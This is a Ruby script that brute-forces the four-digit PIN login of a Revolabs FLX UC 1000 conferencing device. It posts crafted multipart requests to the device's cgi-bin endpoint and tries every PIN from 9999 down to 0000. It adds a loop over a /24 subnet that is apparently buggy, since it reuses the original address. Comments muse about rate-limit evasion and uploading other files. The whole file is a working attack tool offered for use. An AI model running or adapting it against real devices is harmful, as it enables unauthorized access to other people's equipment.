#!/usr/bin/env ruby
## bf_login.rb - brute force the login for the revolabs flx UC 1000

require 'json'
require 'net/http'
require 'uri'

# return a Net::HTTP::Post request suitable for validating +pin+
def get_request(uri, pin)
  request = Net::HTTP::Post.new(uri.request_uri)
  request['Accept']          = 'application/json, text/plain, */*'
  request['Accept-Encoding'] = 'gzip, deflate'
  request['Accept-Language'] = 'en-US,en;q=0.8'
  request['Connection']      = 'keep-alive'
  request['Content-Type']    = 'multipart/form-data; boundary=---------------------------7da24f2e50046;charset=UTF-8'
  request['Origin']          = sprintf('http://%s', uri.host)
  request['Referer']         = sprintf('http://%s/login', uri.host)
  request['User-Agent']      = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'

  # TODO saying there is a cookie set, but we're def not authed.. do we need to rotate this to avoid rate limiting?
  request['Cookie'] = sprintf('_ga=GA1.4.595462255.%s', Time.now.to_i)

  body = Array.new

  body << '-----------------------------7da24f2e50046' # TODO is this a magic number or randomly generated? or?
  body << 'Content-Disposition: form-data; name="file"; filename="temp.txt"' # TODO should look into what happens when we point at a different file..
  body << 'Content-type: plain/text'
  body << '' # newline
  body << sprintf('<properties sys.validate-password="%s"/>', pin)
  body << '-----------------------------7da24f2e50046'

  request.body = body.join("\r\n")
  request
end

# return a Net::HTTP::Response object
def check_pin(url, pin)

  uri  = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)

  request = get_request(uri, pin)
  http.request(request)
end

#
## main()

address   = ARGV.pop
errors    = Array.new
responses = Array.new
output    = sprintf('%s-logs-%s.%s.%s.json', __FILE__, address, Time.now.to_i, $$)

if address.nil?
  puts sprintf('usage: %s <address>', __FILE__)
  exit 1
end

1.upto(254) do |octet|
base = $1 if address.match(/((?:\d{1,3}){3}\.)/)
ip = sprintf('%s.%s', base, octet)
  9999.downto(0) do |i|
    # TODO we should prioritize 0000, 1234, etc

    pin = sprintf('%04d', i)

    begin
      url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', address)

      puts sprintf('trying pin[%s]', pin)

      response = check_pin(url, pin)

      responses << response
      if response.body.match(/1/)
        puts sprintf('INFO: found the pin[%s]', pin)
        break
      end

      #sleep 1 if (i % 100).eql?(0)

    rescue => e
      puts sprintf('ERROR: something bad happened on pin[%s]: [%s:%s]', pin, e.class, e.message)
      errors << { :exception => e, :pin => pin }
    end

  end
end


# marshalling the data, at least until we know what we're looking for
begin

  content = Array.new
  responses.each do |response|
    hash = {
      :code => response.code,
      :body => response.body,
      :size => response.body.size,
    }

    content << hash
  end

  File.open(output, 'w') do |fh|
    fh.print(JSON.pretty_generate(content))
  end

  puts sprintf('SUCCESS: wrote output to[%s]', output)
rescue => e
  puts sprintf('ERROR: [%s]: %s[%s]', e.message, "\n", e.backtrace.join("\n"))
end

# TODO something better here
errors.each do |e|
  puts sprintf('ERROR: pin[%s] trace[%s]', e[:pin], e[:exception])
end

puts sprintf('ERROR: [%d] total errors', errors.size)
exit 1 unless errors.empty?
